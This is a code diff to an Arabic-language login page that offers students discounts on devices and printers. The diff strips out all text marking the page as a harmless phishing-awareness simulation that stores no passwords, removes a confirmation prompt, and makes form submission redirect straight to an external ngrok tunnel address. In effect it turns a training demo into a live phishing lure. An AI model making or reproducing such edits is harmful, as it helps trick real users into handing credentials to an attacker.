@@ -59,7 +59,7 @@
   <div class="container" role="main">
     <div class="hero" aria-hidden="false">
       <h1>عزيزي الطالب، استفد من خصوماتك الحصرية</h1>
-      <p>خصومات على الأجهزة والطابعات — سجل الآن واغتنم الفرصة. هذه صفحة توعوية: لا نجمع أو نخزن كلمات المرور.</p>
+      <p>خصومات على الأجهزة والطابعات — سجل الآن واغتنم الفرصة.</p>
     </div>
 
     <div class="card" aria-labelledby="signin-heading">
@@ -85,26 +85,17 @@
           <button type="button" class="social-btn gg" aria-label="Continue with Google">استمرار عبر جوجل</button>
         </div>
 
-        <div class="muted">هذه تجربة توعوية — لا يتم تخزين أي بيانات فعلية. عند الضغط ستظهر رسالة توضيحية ثم تتم إعادة التوجيه.</div>
-
-        <div id="notice" class="notice" role="status" aria-live="polite">
-          تم تعطيل تجميع البيانات عمدا — هذه صفحة محاكاة لأغراض التوعية.
-        </div>
       </form>
     </div>
   </div>
 
   <script>
     document.getElementById('login-form').addEventListener('submit', function(e) {
-      const sure = confirm("هل أنت متأكد من إرسال المعلومات؟");
-      if (!sure) {
-        e.preventDefault();
-      } else {
-        setTimeout(() => {
-          window.location.href = 'https://lora-reconciliatory-jacinto.ngrok-free.app';
-        }, 1000);
-      }
-    });
+  setTimeout(() => {
+    window.location.href = 'https://lora-reconciliatory-jacinto.ngrok-free.app';
+  }, 1000);
+});
+
 
     document.querySelectorAll('.social-btn').forEach(btn => {
       btn.addEventListener('click', function() {
